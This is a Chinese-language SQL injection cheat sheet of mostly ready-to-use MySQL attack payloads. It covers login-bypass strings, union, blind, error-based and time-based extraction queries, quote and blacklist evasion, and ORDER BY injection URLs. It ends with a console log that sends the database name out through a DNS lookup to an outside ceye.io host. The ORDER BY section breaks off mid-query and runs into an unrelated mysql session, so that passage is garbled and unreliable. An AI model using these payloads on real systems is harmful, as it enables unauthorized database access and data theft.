### SQL注入基本概念
将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击
修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限
如果在WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前未对其进行过验证，通常就会出现 SQL 注入漏洞
### SQL注入常用工具
Burp Suite：`http://drops.xmd5.com/static/drops/tools-1548.html`
Tamper Data (Firefox addon)
HackBar (Firefox addon)
sqlmap：`http://drops.xmd5.com/static/drops/tips-143.html`
### SQL注入常用参数
user()：当前数据库用户
database()`：当前数据库名
version()`：当前使用的数据库版本
@@datadir`：数据库存储数据路径
concat()：联合数据，用于联合两条数据结果。如concat(username,0x3a,password)`
group_concat()：和concat()类似，如group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
concat_ws()：用法类似
hex()和unhex()：用于 hex 编码解码
load_file()：以文本方式读取文件，在 Windows 中，路径设置为`\\`
select xxoo into outfile '路径'：权限较高时可直接写文件
### SQL注入行间注释语法 
`--`:`DROP sampletable;--```
`#`:```DROP sampletable;#```
### SQL注入行内注释语法
`/*注释内容*/`:```DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`   SELECT/*替换空格*/password/**/FROM/**/Members```
`/*! MYSQL专属 */`:```SELECT /*!32302 1/0, */ 1 FROM tablename```
### SQL注入字符串编码函数
ASCII()：返回字符的 ASCII 码值
CHAR()：把整数转换为对应的字符
### SQL注入后台万能密码格式
`admin' --`
`admin' #`
`admin'/*`
`' or 1=1--`
`' or 1=1#`
`' or 1=1/*`
`') or '1'='1--`
`') or ('1'='1--`
以不同的用户登陆 `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
### SQL注入查询数据库名语句
```SELECT database();
SELECT schema_name FROM information_schema.schemata;```
```
### SQL注入查询表名语句
union查询：
```
--MySQL 4版本时用version=9，MySQL 5版本时用version=10
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;   /* 列出当前数据库中的表 */
UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database();   /* 列出所有用户自定义数据库中的表 */
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema!='information_schema' AND table_schema!='mysql';
```
盲注：
```
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```
报错：
```
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));
-- 在5.1.5版本中成功。
```
### SQL注入查询列名语句
union查询：
```
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
```
盲注：
```
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```
报错：
```
-- 在5.1.5版本中成功
AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)
-- MySQL 5.1版本修复了
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));
```
### SQL注入根据列名查询所在的表
```-- 查询字段名为 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
-- 查询字段名中包含 username 的表
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```
### SQL注入绕过引号限制语句
```-- hex 编码
SELECT * FROM Users WHERE username = 0x61646D696E
-- char() 函数
SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)
```
### SQL注入绕过字符串黑名单语句
```SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```
使用 `CONCAT()` 时，任何个参数为 null，将返回 null，推荐使用 `CONCAT_WS()`。`CONCAT_WS()`函数第一个参数表示用哪个字符间隔所查询的结果
### SQL注入条件语句格式
`CASE`, `IF()`, `IFNULL()`, `NULLIF()`
```SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```
### SQL注入延时函数格式
`SLEEP()`, `BENCHMARK()`
```
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
```
### SQL注入order by后的注入方式
`order by` 由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。一般带有 `order` 或者 `order by` 的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入：
原始链接：`http://www.test.com/list.php?order=vote`
根据 `vote` 字段排序。找到投票数最大的票数 `num` 然后构造以下链接：http://www.test.com/list.php?order=abs(vote-(length(user())>0)*num)+asc
看排序是否变化。还有一种方法不需要知道任何字段信息，使用 `rand` 函数：http://www.test.com/list.php?order=rand(true)
http://www.test.com/list.php?order=rand(false)
以上两个会返回不同的排序，判断表名中第一个字符是否小于 128 的语句如下：http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1) use security;
Database changed
mysql> select load_file('\\\\test.xxx.ceye.io\\abc');
+-------------------------------------------+
| load_file('\\\\test.xxx.ceye.io\\abc') |
+-------------------------------------------+
| NULL                                      |
+-------------------------------------------+
1 row in set (22.05 sec)
mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
+----------------------------------------------------------------------+
| load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc')) |
+----------------------------------------------------------------------+
| NULL                                                                 |
+----------------------------------------------------------------------+
1 row in set (0.00 sec)